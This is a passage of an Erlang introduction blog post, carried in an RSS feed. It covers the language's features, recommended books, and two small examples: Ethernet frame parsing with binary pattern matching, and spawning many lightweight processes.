In this blog post I’ll describe some of my discoveries, the resources I used to dive in
and two simple examples that illustrate the power (and beauty) of Erlang.&lt;/p&gt;
&lt;p&gt;I won’t dig deep into the description of the language itself. Some books, listed below,
do it much better than me. I will, however, jump directly to the heart of the language:
Erlang is a dynamically typed functional language running in a virtual machine.
It was developed by Ericson and then open sourced in 1998.&lt;/p&gt;
&lt;p&gt;Some of its awesome features are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;concurrency and distributed programming: this allows you (thanks to its lightweight processes)
to spin a lot of concurrent processes, as shown in an example down below.&lt;/li&gt;
&lt;li&gt;message passing: It uses asynchronous message passing to communicate between different processes.&lt;/li&gt;
&lt;li&gt;fault-tolerant: So you don’t impact all your software if one of your process is performing an illegal instruction.&lt;/li&gt;
&lt;li&gt;OTP: OTP (Open Telecom Platform) is an open source framework that adds a bunch of very useful libraries
to the base language. It brings abstraction libraries and design patterns (called behaviors) that you will be
very eager to use since they are really helpful when building complete software (most people
that are coding in Erlang are actually coding in Erlang/OTP).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href="http://www.erlang.org/faq/introduction.html"&gt;Here&lt;/a&gt;‘s a nice introduction to Erlang.&lt;/p&gt;
&lt;p&gt;So why would you use Erlang ? Well there’s many use cases one can think of, &lt;a href="http://www.erlang.org/faq/introduction.html"&gt;here&lt;/a&gt;‘s
a list of nice use cases where Erlang is suitable (and some where it is not). But as stated on that page,
Erlang is mainly suitable for&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;“Distributed, reliable, soft real-time concurrent systems”.
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Where and how to learn Erlang&lt;/h1&gt;
&lt;p&gt;It’s not always easy to learn a new programming language. Especially when you are used to imperative
languages (procedural, object-oriented, …). A first question one might ask is “is Erlang difficult”.
I would say not really, not more than any other languages, but it is different. Yes, it is
different if you’re not used to thinking in functional. But it’s really fun and very elegant !&lt;/p&gt;
&lt;p&gt;A good starting point (which is also valid for other languages) is &lt;a href="http://learnxinyminutes.com/docs/erlang/"&gt;http://learnxinyminutes.com/docs/erlang/&lt;/a&gt;.
It gives you a quick tour of the language itself (how to declare stuff, how to use variables, what is an atom,
how to use recursion, how to export/import modules, etc). Then one might move to something more complete in order
to understand the distinctive features of the language.&lt;/p&gt;
&lt;p&gt;I’d recommend three books that really helped me dive into Erlang:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Introducing Erlang: Getting Started in Functional Programming&lt;/em&gt; by Simon St. Laurent published by
O’Reilly Media (&lt;a href="http://shop.oreilly.com/product/0636920025818.do"&gt;http://shop.oreilly.com/product/0636920025818.do&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Learn You Some Erlang for Great Good!: A Beginner’s Guide&lt;/em&gt; by Fred Hebert published by
No Starch Press (&lt;a href="http://learnyousomeerlang.com/"&gt;http://learnyousomeerlang.com/&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Designing for Scalability with Erlang/OTP: Implement Robust, Available, Fault-Tolerant Systems&lt;/em&gt;
by Francesco Cesarini and Steve Vinoski published by O’Reilly Media (&lt;a href="http://shop.oreilly.com/product/0636920024149.do"&gt;http://shop.oreilly.com/product/0636920024149.do&lt;/a&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;(1) will give you the basics (syntax, different types (or none of them), function declaration and so on).
(2) will give you nice examples of concrete uses of the language as well as a deep-dive into OTP and finally (3)
will help the most interested of you to use Erlang for developing advanced programs using its main
features (scalability, concurrency, fault-tolerent).&lt;/p&gt;
&lt;p&gt;But as always, nothing is better than practice. So here are two examples using Erlang.&lt;/p&gt;
&lt;h1&gt;Network packet parsing using Erlang&lt;/h1&gt;
&lt;p&gt;One very elegant feature of Erlang is its pattern matching (as other functional languages).
It is very nice when one get down to, for example, parsing packets.&lt;/p&gt;
&lt;p&gt;This is an example of a function which takes as input an Ethernet frame (in binary) and prints its content:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;parse_ethernet&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;
  &lt;span class="n"&gt;Src&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;48&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="n"&gt;Dst&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;48&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="mi"&gt;2048&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="n"&gt;Rest&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;binary&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
  &lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;fwrite&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;~p -&amp;gt; ~p (~p)~n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;integer_to_list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Src&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;integer_to_list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Dst&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;Rest&lt;/span&gt;&lt;span class="p"&gt;]),&lt;/span&gt;
  &lt;span class="n"&gt;parse_ip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Rest&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;parse_ethernet&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
  &lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;fwrite&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;FAILED TO DECODE Ethernet~n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Isn’t it nice? Erlang will transparently try to match the packet with the first function declaration which states:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;get me a binary packet with:&lt;ul&gt;
&lt;li&gt;the first 48 bits are matched to Src&lt;/li&gt;
&lt;li&gt;the next 48 bits are matched to Dst&lt;/li&gt;
&lt;li&gt;the next 16 bits must have a value of 2048 (as we expect IPv4)&lt;/li&gt;
&lt;li&gt;the rest are binaries and matched to Rest&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If it succeed, we can easily print the value of those fields. If it doesn’t, it will fall down
to the second declaration which will simply output an error message.&lt;/p&gt;
&lt;h1&gt;Spinning processes with Erlang&lt;/h1&gt;
&lt;p&gt;The next example shows you how you can spin a lot of Erlang processes.
An Erlang process is very small (309 words as stated &lt;a href="http://www.erlang.org/doc/efficiency_guide/processes.html"&gt;here&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;You can easily spawn a process in Erlang using the function spawn.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Module&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Function&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then you would make the created process wait for a message (using Erlang’s message passing) before quitting:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;procc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
  &lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;fwrite&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;[~p] Process started~n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Id&lt;/span&gt;&lt;span class="p"&gt;]),&lt;/span&gt;
  &lt;span class="n"&gt;receive&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;stop&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
      &lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;fwrite&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;[~p] Process stopped~n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Id&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
  &lt;span class="n"&gt;end&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I’ve been able to spawn 100K processes in less than 30 seconds and 200K processes in about 2 minutes on a i5!&lt;/p&gt;
&lt;p&gt;All the code above is available on github &lt;a href="https://github.com/deadc0de6/erlang-pcap/"&gt;here&lt;/a&gt; and
&lt;a href="https://github.com/deadc0de6/erlang-tests"&gt;here&lt;/a&gt;. These were small projects I did to learn the language
so they might have some design flaws and/or errors but it will give you an idea of the language.&lt;/p&gt;
&lt;p&gt;That’s it, hope this little overview made you want to try Erlang!&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This article was first published on &lt;a href="http://cybermashup.com/2015/12/01/getting-started-with-erlang/"&gt;cybersmashup&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">deadc0de</dc:creator><pubDate>Tue, 01 Dec 2015 00:00:00 +0100</pubDate><guid>tag:deadc0de.re,2015-12-01:articles/erlang-first-steps.html</guid><category>erlang</category><category>programming</category></item></channel></rss>